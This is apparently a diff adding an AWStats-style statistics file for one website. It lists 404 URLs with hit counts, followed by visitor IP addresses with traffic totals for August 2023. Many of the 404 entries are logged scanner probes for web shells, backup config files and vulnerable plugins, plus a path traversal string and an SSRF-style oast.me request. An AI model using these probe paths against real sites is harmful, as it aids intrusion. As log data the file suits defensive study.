+/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php 1 https://omega-ritual.com.ua
+/text.php 1 -
+/ajax-api/2.0/mlflow/model-versions/create 1 -
+/mycommand.php 1 www.google.com
+/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 2 -
+/assets/elFinder-2.1.9/elfinder.html 1 -
+/wp-inm/years.php 3 -
+/Autodiscover/Autodiscover.xml 2 -
+/wp-content/themes/aidreform/include/lang_upload.php 1 -
+/images/vuln.php 1 -
+/wp-content/plugins/wpcargo/readme.txt 2 -
+/dumpmdm.cmd 2 -
+/level/16/exec/show/config/CR 1 -
+/wp-content/plugins/cherry-plugin/admin/css/tinymce-shortcodes.css 1 -
+/report/download.php 1 -
+/PDC/ajaxreq.php 1 -
+/alfa-rex.php 1 www.google.com
+/shell20211028.php 5 www.google.com
+/css/contents.php 8 -
+/mifs/asfV3/api/v2/admins/users 1 -
+/jquery-file-upload/server/php/ 1 -
+/shop 3 www.google.com
+/wp-admin/js/about.php 3 -
+/wp-content/plugins/nd-restaurant-reservations/readme.txt 1 -
+/wp-content/themes/theme-deejay/include/lang_upload.php 1 -
+/old/wp-admin/install.php 2 -
+/view-source: 2 -
+/wp-content/plugins/ultimate-member/readme.txt 4 -
+/storfs-asup 1 -
+/.well-knownold/bala.php 1 -
+/Collector/diagnostics/trace_route 1 -
+/include/exdu.txt 1 -
+/oam/server/opensso/sessionservice 2 -
+/user.action 1 -
+/RestAPI/ImportTechnicians 1 -
+/wp-content/themes/porto/404.php 1 omega-ritual.com.ua
+/wp-content/upgrade/lll/dream.php 3 -
+/wp-temp-ali.php 3 -
+/administrator/ 2 -
+/wp-content/plugins/core-plugin/include.php 26 www.google.com
+/mini.php 1 -
+/recent_scans/ 1 -
+/cgi-bin/mesh.cgi 1 -
+/wp-admin/css/colors/blue/about.php 1 www.google.com
+/ispirit/interface/gateway.php 2 -
+/elfinder/elfinder-cke.html 1 -
+/wp-content/plugins/dzs-zoomsounds/admin/admin.css 2 -
+/wp-content/plugins/elementor-pro/click.php 1 -
+/wp-admin/network/xmrlpc.php 4 -
+/download.action 1 -
+/Collector/nms/addModifyZTDProxy 1 -
+/reports/ 1 -
+/mainfile.php 1 -
+/service/extdirect 1 -
+/Business/ 1 -
+/wp-content/plugins/imagements/images/2ul3xnxzqihyuksz9ybwo9zldbf.php 1 -
+/wp-includes/Requests/Text/admin.php 1 www.google.com
+/ext-js/index.html 1 -
+/wp-content/plugins/ninja-forms/readme.txt 2 -
+/wp-content/plugins/kadence-blocks/dist/blocks-column.css 1 omega-ritual.com.ua
+/wp-content/plugins/wp-user-extra-fields/js/wpuef-configurator.js 2 -
+/apple-touch-icon-152x152.png 1 -
+/upload/setup/install.php 1 -
+/adminfuns.php7 1 -
+/2013 3 www.google.com
+/sitecore/shell/ClientBin/Reporting/Report.ashx 2 -
+/New 3 www.google.com
+/oldsite/wp-admin/install.php 2 -
+/wp-content/plugins/contact-form-7-multi-step-module/readme.txt 1 -
+/wp-content/plugins/nd-learning/readme.txt 1 -
+/wp-content/themes/classic/inc/admin.php 3 -
+/upfile.php 1 -
+/wp-content/themes/bolster-theme/include/lang_upload.php 1 -
+/api/timelion/run 1 -
+/autodiscover/autodiscover.json 4 -
+/wp-includes/bala.php 1 -
+/cgi-bin/xmrlpc.php 3 -
+/2017 3 www.google.com
+/wp-content/plugins/zendrop-dropshipping-and-fulfillment/readme.txt 1 -
+/custom-report-example/..%5C..%5C..%5Cdeployment%5Csharp%5Cicons%5Chome-app.png 1 -
+/wp-content/plugins/fix/up.php 1 -
+/wp-content/themes/snapture/include/lang_upload.php 1 -
+/ajax-api/2.0/mlflow/registered-models/create 1 -
+/404.php 1 -
+/api/system/sessions 1 https://omega-ritual.com.ua
+/nacos/v1/cs/configs 2 -
+/about.php7 3 -
+/wp-content/plugins/elementor-pro/elementor-pro.php 1 -
+/api/manager/submit 1 -
+/wp-content/themes/bolster/include/lang_upload.php 1 -
+/images/json 2 -
+/aj.html 1 -
+/api/agent/tabs/agentData 1 -
+/wp-content/themes/greyd_suite/style.css 2 -
+/dologin.action 1 -
+/wp-content/plugins/wp-pinterest-automatic/changelog 2 -
+/wp-admin/js/widgets/radio.php 3 -
+/chtmlfuns.php 7 -
+/forum 3 www.google.com
+/anchor/errors.log 1 -
+/assets/php/upload.php 1 http://omega-ritual.com.ua
+/new/ 1 -
+/wp-content/plugins/e-signature/page-template/default/style.css 2 -
+/2010 3 www.google.com
+/upload/userfiles/image/2UL3xWmTdUZVF8vGnrhPXdjWkXa.png 1 -
+/apisix/admin/migrate/export 1 -
+/wp-content/plugin/apikey/a57bze8931.php 1 -
+/api.php 3 -
+/wp-includes/shell20211028.php 2 www.google.com
+/ucmdb-api/connect 1 -
+/itop/setup/wizard.php 1 -
+/jexinv4/jexinv4.jsp 4 -
+/Side.php 1 -
+/backup.php 1 omega-ritual.com.ua
+/wp-content/plugins/jupiterx-core/includes/parse-css/vendors/composer/installed.json 1 omega-ritual.com.ua
+/wp-content/themes/churchlife/include/lang_upload.php 1 -
+/wp-content/plugins/wpgateway/css/style.css 1 -
+/wp-content/plugins/lws-affiliation/readme.txt 1 -
+/users/sign_in 7 http://omega-ritual.com.ua/users/sign_in
+/dfsms/ 2 -
+/wp-content/plugins/apikey/apikey.php 7 -
+/wp-content/plugins/vc-tabs/readme.txt 1 -
+/wp-config.php.bak 1 -
+/objects/getImageMP4.php 1 -
+/checkValid 3 -
+/wp-includes/theme-compat/footer-private.php 1 www.google.com
+/wp-admin/xmrlpc.php 3 -
+/wp-content/plugins/superlogoshowcase-wp/css/sls-wp-admin.css 1 -
+/wp-includes/ms-cache.php 3 -
+/wp-content/dropdown.php 1 -
+/years.php 7 -
+/cgi-bin/libagent.cgi 2 -
+/newsite 5 -
+/main/inc/ajax/extra_field.ajax.php 2 -
+/lock360.php 1 -
+/photo/p/api/album.php 2 -
+/cobbler_api 1 -
+/wp-content/plugins/jobboardwp/readme.txt 1 -
+/wp-content/plugins/sid/sidwso.php 2 -
+/wp-content/plugins/nd-booking/readme.txt 1 -
+/card_scan.php 3 -
+/2009 3 www.google.com
+/wp-content/plugins/sitemap-by-click5/readme.txt 1 -
+/uploads/assets/backend/elfinder/elfinder.html 1 -
+/jexws4/jexws4.jsp 4 -
+/updates.php 2 www.google.com
+/web/wp-admin/install.php 2 -
+/console/login/LoginForm.jsp 1 -
+/wp-queryall.php 3 -
+/alfa-rex.php7 9 www.google.com
+/wp-config.php~ 2 -
+/artifactory/ui/auth/login 2 https://omega-ritual.com.ua/artifactory/webapp/
+/yanz.php 3 -
+/docpicker/internal_proxy/http/oast.me 1 http://omega-ritual.com.ua/docpicker/internal_proxy/http/oast.me
+/wp-content/plugins/wp-upg/readme.txt 2 -
+/xmrlpc.php 4 -
+/wp-content/themes/FifteenTen/403.php 3 -
+/FORUM 3 www.google.com
+/wp-admin/bala.php 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 1323
+176.114.0.75 1606 1606 51001717 20230831235324
+40.83.32.131 1040 1041 655495 20230815204804
+95.214.25.84 833 833 757936 20230829061201
+79.110.132.74 131 2476 38705893 20230826090417
+212.113.106.100 87 89 3697273 20230827003458
+94.131.210.225 62 132 3351632 20230807180746
+93.126.112.153 53 202 3277000 20230828195202
+188.130.178.189 45 710 13481725 20230826113654
+86.57.165.170 45 119 3404272 20230817165829
+163.123.143.82 37 37 1271003 20230812070002
+45.90.62.136 0 1 6783 
+185.155.90.85 4 123 7142417 20230803205306
+5.181.248.254 7 60 671171 20230830092205
+168.197.153.196 1 1 125919 20230820111957
+206.189.203.123 1 1 3649 20230808143226
+93.158.90.141 1 1 55369 20230829174231
+113.174.246.52 1 1 477 20230808030647
+185.175.95.19 4 36 839000 20230816095854
+183.88.44.185 1 1 620 20230817133200
+149.19.255.162 1 1 55360 20230816041953
+5.61.33.168 8 8 1956364 20230830202553
+182.253.190.178 1 1 620 20230813023706
+191.98.164.186 1 1 620 20230813023847
+5.192.135.23 1 1 620 20230813023751
+65.20.73.208 2 2 7239 20230831152354
+157.100.138.55 1 1 620 20230819003806
+54.70.126.220 0 1 6783 
+139.59.83.162 1 1 244 20230825200715
+159.192.37.58 1 1 477 20230808030317
+103.51.103.123 3 3 1479 20230822184634
+204.93.169.211 1 1 477 20230823164013
+52.176.90.157 1 1 243051 20230816041111
+45.77.176.121 6 6 15356 20230818061111
+103.163.109.73 1 1 620 20230813023824
+94.23.117.169 8 8 4960 20230831212736
+37.143.131.249 6 6 1464237 20230827011809
+93.47.52.53 3 74 2965147 20230829114355
+14.237.255.132 1 1 477 20230808030129
+54.39.20.17 3 3 7678 20230818080833
+109.70.108.10 4 4 221528 20230826112600
+172.104.4.142 3 3 7678 20230817155730
+93.72.164.162 3 57 733467 20230806133638
+171.244.0.91 3 3 10972 20230824114121
+54.202.66.9 1 1 55391 20230814131716
+139.144.132.62 1 1 477 20230820034451
+91.235.128.12 6 6 1470399 20230825161740
+54.188.210.245 1 1 55853 20230809125036
+78.135.87.2 3 3 7678 20230817200117
+72.5.33.102 15 15 38390 20230818065037
+35.88.197.65 1 1 55365 20230813130910
+188.126.77.47 5 5 1221232 20230825211741
+197.221.227.141 15 15 38390 20230818070718
+46.251.201.145 0 1 84211 
+185.252.86.131 1 1 620 20230825095628
+87.236.176.66 0 1 6770 
+46.226.148.191 6 6 15356 20230818080557
+176.36.107.59 2 30 1091233 20230817194203
+164.90.191.138 11 11 27051 20230818024334
+95.161.239.255 2 42 870930 20230803161241
+100.24.38.26 6 90 120593 20230825145717
+148.72.23.48 3 3 7678 20230818012929
+91.197.169.39 2 74 841564 20230804203901
+46.211.240.169 0 1 86385 
+178.133.45.145 5 60 774199 20230802005410
+46.211.113.215 16 76 2418442 20230822215507
+27.145.164.157 1 1 620 20230817133208
+46.211.65.199 2 32 374114 20230807113158
+44.211.239.66 2 2 110710 20230821033513
+87.236.176.201 0 1 6770 
+176.115.99.45 2 33 385903 20230822225750
+95.173.172.200 9 9 23034 20230818012810
+213.160.71.126 1 1 477 20230823080418
+37.252.5.84 5 5 1221267 20230829092056
+217.70.29.122 2 52 499167 20230816160514
+217.76.139.235 6 6 15356 20230817170155
+46.200.74.85 6 75 917454 20230818164949
+46.161.15.14 9 9 100339 20230831235322
+88.151.192.7 6 6 1464309 20230830032309
+37.57.213.56 2 32 557290 20230809195139
+98.35.69.145 3 3 60276 20230806191907
+178.94.74.95 2 51 1221900 20230809124316
+173.209.33.39 1 1 477 20230822184917
+143.198.169.56 1 1 477 20230822112729
+66.33.216.134 1 1 3709 20230831184345
+31.135.90.40 9 9 215306 20230827012610
+188.190.235.13 2 33 393764 20230817084824
+146.120.101.19 10 53 872706 20230827001314
+66.249.93.130 1 38 592610 20230828120433
+142.93.157.37 1 1 35279 20230802000726
+185.68.108.121 9 9 23034 20230818025440
+159.223.75.239 6 6 15356 20230817234521
+185.65.244.152 8 8 1962513 20230831072556
+89.209.128.250 2 40 1399390 20230808195355
+46.211.96.27 2 60 1787879 20230801185906
+62.76.234.191 9 9 2205642 20230831062556
+185.126.236.155 6 6 1470371 20230826081742
+34.217.14.61 1 1 55391 20230814131946
+176.36.252.202 3 52 449832 20230830131410
+185.14.29.120 7 7 1719528 20230826201807
+94.176.55.41 1 1 55359 20230815041945
+178.128.82.148 3 3 59735 20230830195813
+93.72.166.229 9 66 842701 20230830091617
+185.123.101.94 7 7 1713378 20230831082556
+112.124.39.178 12 12 30712 20230818081858
+143.198.207.136 2 2 1814 20230825185533
+52.42.131.221 1 1 55352 20230822130513
+46.211.88.236 2 51 1227883 20230824121402
+38.180.23.135 6 6 1464310 20230830232555
+68.65.122.149 2 2 986 20230823144045
+52.140.17.41 3 3 10971 20230815213126
+176.36.193.46 11 88 2721550 20230829193231
+62.80.164.86 19 84 1225023 20230802131611
+185.86.77.162 6 6 1464205 20230831152558
+54.186.61.242 0 1 6783 
+45.136.198.155 5 5 1221231 20230827132023
+101.100.3.213 1 1 477 20230818180651
+91.214.85.156 2 35 268046 20230819193658
+182.43.230.63 3 3 11029 20230816211408
+62.72.20.125 1 1 493 20230813093649
+34.75.65.218 3 3 10984 20230824131800
+163.172.67.65 5 5 159806 20230827123631
+46.211.79.104 7 55 997838 20230803085826
+176.36.118.92 2 34 514027 20230813115433
+31.173.82.92 1 11 142818 20230811211905
+74.81.38.26 3 3 10985 20230824075124
+107.21.106.111 27 27 69102 20230818054431
+91.123.150.246 20 83 3519916 20230821181153
+148.72.245.234 2 2 7229 20230823090217
+195.211.144.57 14 59 1178405 20230813222207
+64.227.164.246 9 9 23034 20230818044348
+188.163.99.240 2 2 55394 20230826225714
+185.213.20.176 6 6 1470372 20230827051810
+35.87.116.138 1 1 55391 20230814131755
+31.144.173.4 2 50 913819 20230825192117
+111.13.145.23 3 3 166087 20230831053927
+103.74.70.13 1 1 125911 20230819030155
+177.220.141.54 1 1 620 20230813023728
+37.139.13.81 4 4 14667 20230816153748
+38.62.223.140 1 1 3625 20230818164949
+93.119.227.91 2 2 486026 20230813141643
+77.111.247.52 3 36 285023 20230809193638
+94.155.47.65 3 3 7678 20230817210533
+62.205.156.132 19 78 2128294 20230821214922
+5.61.61.132 4 4 978217 20230822181236
+88.119.176.89 9 9 23034 20230818060233
+199.244.88.218 1 1 55356 20230826004321
+51.91.151.60 3 3 11017 20230814140006
+89.185.84.69 7 7 1713397 20230830142545
+103.27.201.239 3 3 7678 20230818054403
+34.221.206.221 1 1 55365 20230813130935
+194.87.39.249 1 1 249165 20230807215839
+116.110.183.0 1 1 620 20230817133152
+138.201.83.118 6 6 1470383 20230825001534
+54.202.146.11 1 1 55355 20230828130017
+78.46.8.125 1 1 477 20230818171330
+199.250.216.102 9 9 23034 20230818071924
+173.236.61.18 3 3 7678 20230817214741
+128.199.81.103 1 1 3661 20230813222636
+38.152.41.219 1 1 55853 20230809150507
+185.108.129.215 7 7 1713336 20230830052308
+185.135.86.88 6 6 1464277 20230830012309
+173.236.176.131 5 5 66964 20230823092311
+83.142.235.16 1 1 33003 20230807113539
+109.95.48.144 10 61 1677135 20230820124459
+91.196.150.52 2 81 2021285 20230825100722
+176.111.174.153 4 4 738986 20230815225355
+20.92.138.57 2 2 7322 20230814072813
+176.108.73.159 0 1 84211 
+167.61.59.192 1 1 620 20230813024056
+51.254.58.185 6 6 1470356 20230825111738
+193.186.4.100 1 1 55384 20230826135735
+91.219.29.13 8 8 1956532 20230829142057
+183.240.181.41 3 3 166087 20230831053915
+5.188.181.92 6 6 1464255 20230829232308
+46.211.21.172 22 73 1298616 20230816150439
+185.208.182.229 3 3 7678 20230818010418
+162.240.236.65 6 6 15356 20230817183317
+46.246.122.121 4 4 738942 20230818154428
+103.130.218.178 1 1 3662 20230816072915
+178.133.233.46 2 34 404093 20230813100542
+212.110.92.155 1 1 3708 20230809161436
+172.177.205.180 1 1 243037 20230822032252
+185.246.152.246 7 7 1707236 20230831162557
+35.88.130.42 1 1 55365 20230813130901
+148.253.82.136 3 3 7678 20230817113513
+185.200.20.186 1 1 493 20230831081206
+95.133.81.243 1 29 290789 20230827211850
+123.6.49.18 2 51 492305 20230801100303
+159.223.63.83 3 3 7678 20230817131622
+91.123.150.84 5 19 394993 20230813100722
+3.83.4.147 1 1 55888 20230808042404
+181.43.102.190 1 1 3649 20230809004616
+52.203.23.91 0 2 13566 
+193.242.162.253 25 96 2510710 20230816154745
+178.136.234.226 5 113 1481886 20230815151028
+34.79.160.234 2 2 111810 20230806180214
+46.211.77.149 4 49 1559645 20230810104025
+38.180.17.18 8 8 1968710 20230826121804
+62.244.48.135 30 89 1488554 20230821141231
+92.53.96.179 1 1 3649 20230808150717
+41.104.250.210 1 1 477 20230808030910
+176.53.217.128 1 2 62148 20230813212410
+93.72.226.129 1 10 136617 20230807114341
+46.133.134.174 1 29 279713 20230820084312
+46.41.137.48 1 1 477 20230820081533
+149.28.129.104 15 15 38390 20230818070118
+88.155.112.45 2 30 391191 20230821195610
+212.227.254.110 6 6 15356 20230817212530
+58.217.204.219 3 3 166087 20230831053919
+180.242.130.58 1 1 477 20230808030831
+91.123.151.50 0 6 148634 
+143.198.77.250 1 1 55369 20230817040559
+44.193.220.153 1 1 55361 20230811234829
+5.175.47.34 2 2 102731 20230827093513
+181.66.139.9 1 1 477 20230808030425
+185.170.214.146 7 7 1713444 20230831042554
+159.65.137.180 2 2 7322 20230813195506
+68.178.150.78 2 2 7229 20230823091257
+38.152.36.131 1 1 55361 20230812042337
+45.95.232.4 9 9 2205668 20230829222306
+72.14.201.68 1 1 55368 20230818172502
+177.89.182.111 1 1 477 20230808030227
+123.138.122.116 3 3 166087 20230831053947
+176.9.114.107 1 1 55385 20230815175501
+46.211.151.120 1 47 605060 20230811145405
+219.151.138.203 2 2 110718 20230831053928
+185.39.204.108 6 6 1464233 20230831052556
+192.64.7.78 1 1 226 20230822090432
+185.126.238.220 8 8 1956418 20230829112057
+178.128.160.8 1 1 3662 20230815230153
+39.108.148.88 1 1 3649 20230808135755
+165.22.13.126 1 1 477 20230823013052
+18.191.193.87 6 51 666340 20230816070942
+109.86.157.222 3 58 711890 20230807093913
+176.37.134.236 2 39 437753 20230818192750
+35.212.137.141 3 28 326639 20230813052112
+193.25.177.30 11 59 862944 20230802121824
+34.222.117.179 1 1 55356 20230826130615
+137.117.65.231 2 2 1240 20230830184604
+165.22.63.34 3 3 7678 20230817212700
+46.211.238.154 2 48 912695 20230815163033
+122.17.135.89 6 6 15356 20230818053515
+167.71.241.14 1 1 30386 20230807070745
+185.128.158.153 12 76 1910264 20230810130042
+162.241.62.25 2 2 7204 20230807084040
+72.14.201.50 5 5 181472 20230831112000
+185.126.237.171 6 6 1470340 20230826171805
+178.133.188.121 2 37 1372704 20230806024742
+52.165.38.4 1 1 243060 20230831101051
+35.89.193.47 1 1 55863 20230803181537
+37.140.216.216 4 4 14372 20230822141617
+89.209.80.10 0 1 25813 
+95.59.26.66 1 1 55355 20230820201605
+51.15.197.70 6 6 15356 20230818022224
+103.245.34.226 3 3 7678 20230818034025
+65.109.239.65 1 1 55349 20230831145031
+212.55.69.59 2 36 2859580 20230820155842
+194.39.67.52 1 1 3661 20230814100329
+109.238.12.156 2 2 110714 20230824230616
+176.37.39.227 2 36 418547 20230828093901
+5.9.116.173 1 1 477 20230821125556
+148.218.65.21 9 9 23034 20230818045457
+217.30.10.16 6 6 1470460 20230829012056
+188.165.206.18 4 4 14608 20230816033508
+54.201.249.59 1 1 55863 20230804125818
+52.165.38.118 1 1 243036 20230830035231
+193.95.61.163 1 1 477 20230808032430
+178.210.215.35 9 64 854307 20230830211201
+5.34.183.253 6 6 1470372 20230827081818
+161.97.147.235 1 1 493 20230823161448
+113.207.70.231 2 2 110718 20230831054001
+185.89.156.119 1 1 477 20230808030433
+93.114.185.242 3 3 7678 20230817161500
+92.253.212.135 6 35 933238 20230803205944
+47.89.195.210 1 1 55391 20230814014426
+64.225.33.63 1 1 203595 20230809094634
+176.36.115.21 9 63 902342 20230822113710
+62.72.18.65 12 12 30712 20230818075439
+31.14.238.99 8 8 1956489 20230831142558
+91.232.21.247 1 1 55902 20230806165245
+176.37.65.243 3 61 1309572 20230808223954
+103.195.201.198 1 1 620 20230819003700
+69.163.193.78 1 1 55355 20230827211944
+138.68.177.197 1 1 55897 20230801040601
+103.143.195.213 1 1 161323 20230818054401
+198.2.76.181 32 86 1398215 20230811010414
+178.133.93.99 2 34 386921 20230806223236
+103.151.42.107 1 1 477 20230808030125
+35.166.60.124 1 1 55391 20230814131932
+94.25.179.34 15 28 554077 20230805043931
+137.226.113.15 3 3 166050 20230818133718
+138.185.14.34 1 1 620 20230819003729
+105.191.72.202 1 1 620 20230819003723
+46.211.115.150 15 65 1146160 20230810154855
+180.244.160.195 1 1 125911 20230818172601
+138.201.115.22 6 6 1464210 20230830222554
+159.203.59.39 1 1 477 20230822004554
+202.78.227.82 6 6 15356 20230817233053
+193.186.4.47 1 1 55351 20230814114615
+173.212.205.93 1 1 477 20230824041409
+43.245.218.248 1 1 125922 20230821181200
+139.180.162.143 6 6 15356 20230817230123
+91.68.32.227 28 67 4398437 20230822002116
+80.79.121.40 7 7 1707271 20230830192553
+185.186.77.224 6 6 1464211 20230830072310
+31.42.189.128 3 3 77571 20230801021953
+137.59.125.74 2 2 7311 20230816024923
+185.87.151.222 6 6 1464423 20230830132542
+195.54.170.238 7 7 1713388 20230827152024
+109.165.84.40 2 42 520312 20230801042941
+192.222.190.119 5 5 14863 20230817222400
+181.168.199.110 1 1 620 20230813023850
+166.1.155.55 5 5 1221180 20230825031535
+89.105.233.50 6 51 1554430 20230802182259
+45.55.195.83 3 3 7678 20230817204801
+125.163.98.147 1 1 620 20230819003741
+79.137.194.110 6 6 15356 20230817204301
+194.104.23.134 2 34 400568 20230830091549
+68.183.37.193 1 1 55394 20230821052146
+158.220.100.206 3 3 7678 20230818015428
+77.29.22.8 1 1 493 20230822110606
+161.35.105.149 1 1 55894 20230807040922
+181.66.139.219 1 1 620 20230813023837
+143.244.46.133 1 3 426736 20230813133956
+101.43.135.233 15 15 38390 20230818001653
+141.105.134.99 8 54 1663476 20230826193326
+46.27.152.113 1 1 477 20230808030157
+91.228.218.86 7 7 1719512 20230826121804
+45.82.13.2 7 7 1713379 20230830082309
+193.186.4.50 6 6 311657 20230828144258
+208.113.190.66 1 1 493 20230812211251
+15.235.192.109 9 9 23034 20230818080726
+123.125.244.69 3 3 166087 20230831054003
+118.70.181.108 1 1 161323 20230818172537
+117.196.41.9 1 1 620 20230817133144
+171.244.10.38 12 12 83293 20230818020027
+15.237.116.183 5 5 11695 20230818065939
+176.59.35.109 3 43 1147338 20230815104801
+93.113.111.193 2 2 7229 20230823134441
+168.121.107.176 1 1 161409 20230817192712
+162.19.3.52 6 6 1464237 20230831092555
+91.149.242.103 6 6 1464334 20230829132058
+45.136.196.81 5 5 1221220 20230829162059
+162.142.125.223 1 3 69454 20230808142646
+46.211.116.220 3 40 1209159 20230804224155
+52.60.73.157 1 1 477 20230822141129
+156.220.101.212 1 1 620 20230813023826
+46.211.67.232 2 27 222001 20230816180940
+37.143.130.26 9 9 2211891 20230831002554
+37.143.129.109 6 6 1464237 20230831112558
+88.242.137.147 1 1 620 20230817133138
+45.95.233.29 6 6 1470333 20230830022308
+124.120.253.22 1 1 620 20230819003718
+195.133.36.146 6 6 1464309 20230827222031
+38.180.21.29 7 7 1707268 20230831182603
+162.13.103.83 18 18 46068 20230818045344
+77.123.173.218 0 1 31501 
+46.211.125.55 5 41 530562 20230813105406
+52.26.190.156 1 1 55853 20230809125120
+144.126.129.164 2 2 110714 20230824230631
+185.186.79.61 5 5 1221294 20230829022054
+162.241.216.32 1 1 620 20230830184609
+8.129.212.192 1 1 3661 20230809134703
+193.228.128.10 7 7 1713355 20230825141739
+51.105.26.100 1 2 1981 20230809133913
+46.161.15.38 10 10 111350 20230829215759
+109.165.170.134 1 1 620 20230813024058
+103.61.102.10 1 1 620 20230813023741
+62.112.9.165 4 4 739040 20230811183701
+195.158.199.88 10 63 1504026 20230807123611
+203.83.172.147 1 1 161396 20230820111948
+95.164.34.101 6 6 1470452 20230831122558
+190.80.50.32 1 1 620 20230813023832
+154.180.132.18 1 1 161314 20230815175927
+46.211.94.117 7 47 2231775 20230801195824
+87.236.176.220 0 1 6770 
+45.187.213.3 1 1 620 20230813023910
+112.46.10.35 2 2 110718 20230831053935
+187.187.201.169 1 1 620 20230813024109
+54.187.120.31 1 1 55357 20230810130427
+148.72.207.163 1 1 3661 20230809073002
+37.52.207.89 5 39 624309 20230818133212
+68.178.167.155 3 3 7678 20230817160725
+37.57.124.30 3 63 842097 20230805160335
+180.211.108.182 1 1 3661 20230814105432
+79.133.41.123 6 6 15356 20230817164251
+82.136.32.202 3 3 7678 20230818014655
+173.236.176.15 2 2 7357 20230816162611
+216.109.167.91 1 1 55368 20230819043255
+194.26.213.183 6 6 1470387 20230824201535
+5.133.192.140 1 2 62671 20230808183724
+176.37.53.209 2 37 261385 20230829174753
+188.119.119.192 1 1 55391 20230814042011
+213.111.82.132 1 1 55906 20230806000723
+185.155.99.101 6 6 1470540 20230828202047
+177.215.107.84 1 1 620 20230819003822
+8.219.190.104 12 12 30712 20230818075740
+115.75.176.158 1 1 620 20230813024021
+132.226.209.208 2 2 102731 20230827013433
+193.106.56.32 6 84 5645606 20230807193625
+103.28.36.212 5 5 3100 20230831164010
+35.195.43.97 3 3 11029 20230824145405
+83.229.117.101 2 2 0 20230819042425
+20.234.144.47 2 2 7323 20230816142934
+43.154.9.162 1 1 3662 20230824062452
+46.211.81.176 2 34 400471 20230813100651
+94.45.107.126 8 107 4310680 20230812092543
+34.208.72.37 1 1 55356 20230826130616
+138.59.36.149 1 1 620 20230819003803
+219.135.97.88 1 1 55369 20230830054004
+104.131.162.226 9 9 23034 20230818050548
+95.58.7.122 1 1 620 20230813023840
+79.110.134.252 28 84 1332822 20230804094808
+3.137.201.114 1 1 55370 20230828232651
+213.188.68.118 1 1 55350 20230818042304
+103.172.205.112 6 6 15356 20230818060621
+165.232.72.175 15 15 38390 20230818074604
+46.211.91.181 3 39 608737 20230827151239
+14.181.42.169 1 1 620 20230813023716
+198.244.207.207 5 5 1227362 20230828082038
+116.163.31.39 2 2 110718 20230831053936
+104.248.94.25 6 6 15356 20230818011002
+112.64.213.32 2 2 110718 20230831054009
+188.132.192.132 6 6 1470337 20230826101742
+176.53.220.171 1 3 68925 20230815072536
+46.211.151.131 12 58 992028 20230816220206
+144.91.68.184 6 6 15356 20230817211929
+46.41.136.44 1 1 477 20230819082149
+85.238.104.247 26 102 2445383 20230822121436
+161.35.166.20 1 1 55411 20230811045810
+103.48.180.153 1 1 620 20230817133148
+176.36.254.83 1 3 29170 20230814230722
+103.102.234.4 6 6 15356 20230817233734
+24.199.87.70 1 1 32937 20230809033020
+151.106.109.242 12 12 30712 20230818080040
+88.99.136.18 1 1 55369 20230830131822
+125.164.234.51 1 1 620 20230819003706
+178.32.13.5 5 5 1221306 20230826011741
+46.219.250.75 6 87 1094424 20230805181051
+24.199.101.177 1 1 55385 20230815055112
+18.218.234.52 3 3 7678 20230817184129
+154.118.140.5 2 41 530651 20230811194035
+94.25.179.18 2 39 486709 20230817223630
+93.39.217.133 2 2 7323 20230816120558
+197.54.198.32 1 1 620 20230813023656
+104.193.142.7 12 12 30712 20230818024540
+78.106.142.90 14 66 1196957 20230803231449
+130.0.237.153 7 7 1713409 20230826031744
+138.97.177.110 1 1 477 20230808030207
+125.166.13.224 1 1 620 20230813023950
+135.181.195.219 3 3 7678 20230817234848
+194.104.23.205 19 135 7241898 20230807210413
+72.0.213.179 2 2 954 20230823022852
+46.211.65.30 2 31 366274 20230802173245
+82.193.127.16 7 59 1905647 20230824115146
+77.111.244.19 8 69 1331955 20230809171142
+77.111.244.25 1 1 30415 20230805153625
+94.244.46.63 7 58 1567003 20230810125418
+35.86.171.218 0 1 6783 
+193.186.4.33 1 1 27194 20230828180614
+154.41.254.215 12 12 30712 20230818051000
+176.36.209.134 8 52 692580 20230810145631
+93.170.68.210 1 1 160742 20230831162316
+69.4.89.106 2 2 486008 20230816073531
+41.191.65.62 1 1 477 20230808032912
+144.91.72.98 2 2 7185 20230815134519
+185.159.163.238 6 42 697563 20230818044133
+18.237.133.230 1 1 55355 20230828130135
+51.68.219.103 1 1 243015 20230830092309
+23.97.205.210 1 1 3693 20230808192141
+45.90.62.51 0 1 6783 
+52.16.173.81 1 1 477 20230823183907
+67.205.11.198 1 1 3661 20230824023832
+45.90.61.228 1 2 62174 20230814231945
+69.163.225.135 4 4 14363 20230807135600
+46.211.85.124 17 67 2015234 20230829155207
+158.140.180.76 1 1 620 20230819003834
+137.184.109.0 1 1 55377 20230823100552
+46.211.67.136 7 47 752027 20230829154319
+93.114.239.97 1 1 55398 20230817042126
+172.172.16.103 4 4 972228 20230829235033
+167.235.1.20 1 1 243037 20230824062939
+89.238.73.79 2 2 55602 20230819101458
+45.119.82.52 1 1 3662 20230815234739
+46.211.80.29 2 32 379971 20230819232544
+194.87.216.62 6 6 1470380 20230830152553
+77.68.96.172 1 1 477 20230823193830
+67.205.58.105 1 1 3708 20230824161012
+117.34.17.19 3 3 166087 20230831053926
+103.82.13.168 1 1 620 20230813024030
+37.19.223.106 4 4 738983 20230827174408
+45.132.58.24 2 35 574675 20230813103646
+69.163.224.107 1 1 3661 20230823192139
+185.236.228.101 1 1 55349 20230831034025
+185.244.159.195 14 70 1469006 20230809150623
+91.201.65.177 6 6 1464218 20230831022554
+147.78.47.249 1 1 822 20230805073620
+85.18.0.132 2 51 492741 20230810004332
+82.79.17.250 6 6 15356 20230817200657
+62.210.103.248 2 2 102724 20230827093513
+5.161.121.35 2 2 111243 20230810015147
+116.204.121.147 1 1 620 20230828003656
+187.29.253.98 1 1 620 20230813023920
+88.155.103.162 16 71 1312903 20230809182305
+193.178.51.5 4 50 770311 20230807174153
+213.202.208.62 5 5 1221232 20230825221740
+52.20.7.112 3 3 1431 20230823224353
+95.158.38.29 7 59 633035 20230805152711
+163.43.28.74 9 9 23034 20230817232648
+92.204.53.85 6 6 15356 20230817224032
+172.233.249.55 2 2 110754 20230824042803
+38.180.20.32 6 6 1464215 20230826231806
+3.110.90.168 6 6 15356 20230817135401
+45.81.39.104 1 1 55368 20230818223721
+146.190.71.232 1 1 3662 20230824140600
+188.163.72.62 8 60 1720190 20230826135822
+176.105.197.223 4 42 697662 20230828185421
